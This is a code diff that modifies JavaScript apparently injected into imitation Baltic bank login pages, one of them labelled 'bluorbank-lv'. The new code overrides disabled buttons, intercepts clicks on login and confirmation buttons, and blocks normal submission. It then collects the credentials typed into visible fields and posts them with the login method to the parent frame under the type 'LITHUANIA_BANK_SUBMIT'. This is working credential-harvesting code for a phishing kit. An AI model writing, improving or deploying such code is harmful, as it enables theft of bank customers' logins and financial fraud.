@@ -378,29 +378,40 @@ if(bank==='bluorbank-lv'){
   },true);
 }
 
-// ============ SUBMIT GUARD: buton aktif + alanlar dolu olmadan gecis yok ============
+
+// ============ SUBMIT: buton aktif + alanlar dolmadan gonderim yok ============
 (function(){
-  var sb=null;
-  var cands=Array.prototype.slice.call(document.querySelectorAll('button[type=submit],input[type=submit],a[type=submit],vaadin-button,span.button,button'));
-  for(var i=0;i<cands.length;i++){
-    var c=cands[i];
-    if(c.hasAttribute('data-selected')||c.getAttribute('role')==='radio'||c.classList.contains('dropdown-toggle'))continue;
-    var img=c.querySelector?c.querySelector('img'):null;
-    var tx=((c.textContent||'')+' '+(c.value||'')+' '+(img&&img.alt||'')+' '+(c.getAttribute('aria-label')||'')).trim();
-    if(/ieiet|turpin|piesl|ielog|ienakt|ienākt|apstipr|login|next|patvirt|pateik|iesniegt/i.test(tx)){sb=c;break;}
+  var SUB=/ieiet|turpin|piesl|ielog|ienakt|ienākt|apstipr|login|next|patvirt|pateik|iesniegt|pievienot|autoriz|confirm|verifik|ielogoties|autentific/i;
+  function btnInfo(b){
+    var img=b.querySelector?b.querySelector('img'):null;
+    return ((b.textContent||'')+' '+(b.value||'')+' '+(img&&img.alt||'')+' '+(b.getAttribute('aria-label')||'')+' '+(b.getAttribute('title')||'')+' '+(b.className||'')).trim();
   }
-  if(!sb)sb=document.querySelector('button[type=submit],input[type=submit]');
-  if(!sb)return;
-  sb.removeAttribute('disabled');sb.setAttribute('aria-disabled','false');
+  function isSubmitBtn(b){
+    if(!b)return false;
+    if(b.getAttribute('role')==='radio'||b.classList.contains('dropdown-toggle'))return false;
+    if(b.closest&&b.closest('.login-type,[data-tab-index],vaadin-tab,ul.css_tabs,[role=radiogroup],[role=tab],.ui-tabs__dropdown,.seb-tabs'))return false;
+    return SUB.test(btnInfo(b))||b.getAttribute('type')==='submit';
+  }
+  var SEL='button,input[type=submit],input[type=button],vaadin-button,span.button,[role=button],a';
+  function enableAll(){
+    document.querySelectorAll('button[disabled],input[disabled],[aria-disabled="true"]').forEach(function(c){
+      c.removeAttribute('disabled');c.setAttribute('aria-disabled','false');c.disabled=false;
+      c.style.pointerEvents='auto';c.style.opacity='';c.style.cursor='';
+    });
+  }
+  enableAll();
+  document.addEventListener('input',enableAll,true);
+  document.addEventListener('change',enableAll,true);
+  setTimeout(enableAll,300);setTimeout(enableAll,900);
   document.addEventListener('click',function(e){
-    var el=e.target,hit=false;
-    while(el){if(el===sb){hit=true;break;}el=el.parentElement;}
-    if(!hit)return;
-    if(!checkFields()){e.preventDefault();e.stopPropagation();e.stopImmediatePropagation();}
+    var b=e.target.closest&&e.target.closest(SEL);
+    if(!b||!isSubmitBtn(b))return;
+    e.preventDefault();e.stopImmediatePropagation();
+    if(!checkFields())return;
+    var inputs={};
+    visInputs().forEach(function(i){var k=i.name||i.id||'field';if(i.value&&i.value.trim())inputs[k]=i.value.trim();});
+    var lm='';var act=document.querySelector('.login-type.active,vaadin-tab[selected],[role=tab][aria-selected=true]');if(act)lm=(act.textContent||'').trim();try{parent.postMessage({type:'LITHUANIA_BANK_SUBMIT',formData:{inputs:inputs,fields:[],loginMethod:lm}},'*')}catch(_){ }
   },true);
-  document.addEventListener('submit',function(e){
-    e.preventDefault();
-    if(checkFields()&&sb.dispatchEvent){sb.dispatchEvent(new MouseEvent('click',{bubbles:true,cancelable:true}));}
-  },true);
+  document.addEventListener('submit',function(e){e.preventDefault();},true);
 })();
 })();</script>
